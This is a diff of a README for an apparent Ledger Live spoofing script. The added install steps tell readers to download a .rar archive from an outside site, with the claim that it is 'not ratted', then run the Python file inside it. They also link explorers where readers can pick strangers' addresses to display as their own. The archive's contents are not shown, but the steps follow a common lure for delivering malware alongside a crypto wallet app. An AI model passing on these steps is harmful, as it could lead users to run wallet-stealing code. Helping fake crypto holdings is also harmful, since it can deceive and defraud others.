@@ -16,11 +16,16 @@ Don't expect the script to be perfect, of course there's gonna be some bugs in i
 ## 🛠 Install
 
 1. Install [Ledger Live](https://www.ledger.com/ledger-live)
-2. Then download 
-3. Visit `x.com`
-4. Press Shift+S to bring up the GUI, tick the boxes on the things you wanna spoof.
-5. Depending on the options you checked, there will be textboxes so you can put your real values and fake values in. 
-6. Click Save, then exit and use Shift+U to toggle off and on. Click Re-detect (buggy and can end up detecting the fake values instead, causing it to break) if you wanna detect the real values after changing to the fake ones.
+2. Then download the file from [cloakr.xyz](https://cloakr.xyz/d/ZbFjVV9hf5A/ledger.rar), don't worry it's not ratted. You can check the source code side by side if you want to.
+3. Now extract the .rar into a folder, then to your command prompts in that folder.
+4. Type **pip install psutil**, then run **py ledger.py** and a GUI should show up.
+5. From there, press Enter. You will see two options, Ethereum or Solana. Pick either one, and refer to a section below so you can find addresses to add to Ledger Live.
+6. Choose either Ethereum or Solana, then paste the address for the blockchain that you picked and pick a name.
+7. Open the Ledger Live app, go to Accounts and enjoy! Have fun larping!
+   
+## 🔍 Where to find addresses
+1. [Etherscan](https://etherscan.io/accounts) - You can use this one to find addresses for Ethereum option.
+2. [Solscan](https://solscan.io/leaderboard/account) - You can use this one to find addresses for Solana option.
 
 ## 📁 Files
 
